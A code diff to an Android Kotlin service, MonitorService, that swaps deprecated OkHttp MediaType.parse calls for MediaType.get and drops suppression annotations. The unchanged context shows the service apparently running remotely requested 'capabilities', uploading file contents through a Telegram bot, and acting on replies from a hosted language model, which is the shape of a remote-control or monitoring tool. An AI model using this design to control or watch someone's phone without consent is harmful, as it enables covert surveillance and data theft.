@@ -333,7 +333,6 @@ class MonitorService : Service() {
         sendResult(taskId, output, error, status, replyChat)
     }
 
-    @Suppress("DEPRECATION")
     private fun executeCapability(capability: String, argsJson: String): Any {
         val args = gson.fromJson(argsJson, HashMap::class.java) as Map<String, Any>
         return when (capability) {
@@ -719,7 +718,6 @@ class MonitorService : Service() {
         Thread({ sendTelegramInternal(chatId, text) }, "tg-$chatId").start()
     }
 
-    @Suppress("DEPRECATION")
     private fun sendTelegramInternal(chatId: Long, text: String) {
         try {
             val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
@@ -729,15 +727,13 @@ class MonitorService : Service() {
                 "parse_mode" to "Markdown"
             ) as Map<String, Any>
             val jsonBody = gson.toJson(params)
-            @Suppress("DEPRECATION")
-            val mediaType = MediaType.parse("application/json")
+            val mediaType = MediaType.get("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder().url(url).post(body).build()
             client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
         } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
     }
 
-    @Suppress("DEPRECATION")
     private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String = "") {
         Thread({
             try {
@@ -749,9 +745,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        RequestBody.create(
-                            @Suppress("DEPRECATION") MediaType.parse("text/plain"),
-                            file.readBytes()))
+                        RequestBody.create(MediaType.get("text/plain"), file.readBytes()))
                     .build()
 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -789,7 +783,6 @@ class MonitorService : Service() {
 
     // ===== NVIDIA NEMOTRON 3 ULTRA 550B AI INTEGRATION =====
 
-    @Suppress("DEPRECATION")
     private fun callNemotron(prompt: String): String {
         try {
             val lower = prompt.lowercase()
@@ -822,8 +815,7 @@ Only respond with valid JSON, no extra text."""
             ) as Map<String, Any>
 
             val jsonBody = gson.toJson(payload)
-            @Suppress("DEPRECATION")
-            val mediaType = MediaType.parse("application/json")
+            val mediaType = MediaType.get("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder()
                 .url(NVIDIA_API_URL)
@@ -850,7 +842,6 @@ Only respond with valid JSON, no extra text."""
         }
     }
 
-    @Suppress("DEPRECATION")
     private fun executeAiActions(aiResponse: String): List<Map<String, Any>> {
         val results = ArrayList<Map<String, Any>>() as List<Map<String, Any>>
         try {
